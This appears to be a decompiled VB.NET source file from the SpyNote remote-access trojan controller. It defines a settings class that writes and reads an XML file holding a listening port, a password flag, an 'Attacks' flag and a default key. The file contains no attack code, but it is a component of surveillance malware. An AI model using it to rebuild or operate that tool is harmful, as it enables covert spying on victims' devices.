Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System.Text
Imports System.Xml
Imports SpyNote_V6._4.SN.SpyNote.Stores

Namespace SN.SPYXml
    Public Class XMLSettings
        Public PATHXML As String

        Public MyXML As XmlDocument

        Public Sub New()
            Me.PATHXML = Store.Resources(1) + "\Imports\Xml\Settings\SpyNote.xml"
            Me.MyXML = New XmlDocument()
        End Sub

        Public Sub LoadXML()
            Dim flag As Boolean = Not File.Exists(Me.PATHXML)
            If flag Then
                Dim xmlTextWriter As XmlTextWriter = New XmlTextWriter(Me.PATHXML, Encoding.UTF8)
                xmlTextWriter.WriteStartDocument(True)
                xmlTextWriter.Formatting = Formatting.Indented
                xmlTextWriter.Indentation = 2
                xmlTextWriter.WriteStartElement("SpyNote")
                Me.CreateNode(Conversions.ToString(0), "Port", "3210", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(1), "Password", "False", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(2), "Attacks", "False", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(3), "KeyPass", "0123456789", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(4), "View", "11111", xmlTextWriter)
                Me.CreateNode(Conversions.ToString(5), "T", "00000", xmlTextWriter)
                xmlTextWriter.WriteEndElement()
                xmlTextWriter.WriteEndDocument()
                xmlTextWriter.Close()
            End If
            Me.MyXML.Load(Me.PATHXML)
        End Sub

        Private Sub CreateNode(pID As String, pName As String, pPrice As String, writer As XmlTextWriter)
            Try
                writer.WriteStartElement("item")
                writer.WriteStartElement("id")
                writer.WriteString(pID)
                writer.WriteEndElement()
                writer.WriteStartElement("name")
                writer.WriteString(pName)
                writer.WriteEndElement()
                writer.WriteStartElement("value")
                writer.WriteString(pPrice)
                writer.WriteEndElement()
                writer.WriteEndElement()
            Catch ex As Exception
                Interaction.MsgBox(ex.Message, MsgBoxStyle.Exclamation, Store.Resources(0))
            End Try
        End Sub

        Public Sub Edit(ParmeterString As String, ParmeterInteger As Integer, Parmetervalue As String)
            Try
                Me.MyXML.DocumentElement.GetElementsByTagName(ParmeterString).Item(ParmeterInteger).InnerText = Parmetervalue
                Me.MyXML.Save(Me.PATHXML)
            Catch ex As Exception
                Interaction.MsgBox(ex.Message, MsgBoxStyle.Exclamation, Store.Resources(0))
            End Try
        End Sub

        Public Function Reading(ParmeterString As String, ParmeterInteger As Integer) As String
            Dim result As String
            Try
                result = Me.MyXML.DocumentElement.GetElementsByTagName(ParmeterString).Item(ParmeterInteger).InnerText
                Return result
            Catch expr_21 As Exception
                Dim ex As Exception = expr_21
                Interaction.MsgBox(ex.Message, MsgBoxStyle.Exclamation, Store.Resources(0))
            End Try
            result = Nothing
            Return result
        End Function
    End Class
End Namespace
